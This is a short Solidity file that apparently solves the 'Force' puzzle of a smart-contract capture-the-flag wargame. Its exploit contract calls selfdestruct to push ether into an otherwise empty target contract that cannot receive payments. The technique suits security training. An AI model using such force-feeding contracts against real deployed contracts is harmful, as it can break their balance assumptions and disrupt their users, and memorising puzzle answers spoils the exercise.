// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceExploit{
    address public force; 

    constructor(address _force) public {
        force = _force;
    }

    function destroy() public {
        
    }

    function sendEther() public payable{
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}